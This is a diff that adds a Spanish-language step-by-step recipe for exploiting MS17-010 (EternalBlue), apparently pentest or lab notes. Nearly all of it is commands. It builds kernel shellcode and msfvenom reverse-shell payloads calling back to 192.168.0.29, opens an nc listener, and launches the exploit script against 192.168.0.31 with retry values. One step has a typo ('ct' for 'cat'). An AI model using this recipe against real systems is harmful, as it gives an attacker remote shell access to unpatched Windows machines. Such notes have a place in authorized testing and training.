@@ -1,0 +1,34 @@
+1. clonar el repositorio https://github.com/worawit/MS17-010.
+
+2. Ensamblar el kernel para x64
+nasm -f bin MS17-010/shellcode/eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin
+
+3. Generar un payload .bin x64
+ msfvenom -p windows/x64/shell_reverse_tcp LPORT=4444 LHOST=192.168.0.29 --platform windows -a x64 --format raw -o sc_x64_payload.bin
+ 
+4. Concentrar ambos archivos en uno solo
+ cat sc_x64_kernel.bin sc_x64_payload.bin > sc_x64.bin
+ 
+5. Ensamblar el kernel para x86
+ nasm -f bin MS17-010/shellcode/eternalblue_kshellcode_x86.asm -o ./sc_x86_kernel.bin
+ 
+6. Generar un payload .bin x86
+ msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=192.168.0.29 --platform windows -a x86 --format raw -o sc_x86_payload.bin
+ 
+7. Concentrar ambos archivos en uno solo
+ ct sc_x86_kernel.bin sc_x86_payload.bin > sc_x86.bin
+
+8. Combinar ambos archivos .bin en uno solo 
+ python MS17-010/shellcode/eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin
+ 
+9. poner a la escucha un nc en el puerto previamente programado
+nc -nvlp 4444
+
+10. Lanzar el ataque
+ python MS17-010/eternalblue_exploit7.py 192.168.0.31 sc_all.bin
+ 
+11. si no funciona, se debe cambiar la carga aumentando de 10 en 10 o 5 en 5 los valores.
+ python MS17-010/eternalblue_exploit7.py 192.168.0.31 sc_all.bin 10
+  python MS17-010/eternalblue_exploit7.py 192.168.0.31 sc_all.bin 20
+   python MS17-010/eternalblue_exploit7.py 192.168.0.31 sc_all.bin 30
+    python MS17-010/eternalblue_exploit7.py 192.168.0.31 sc_all.bin 40
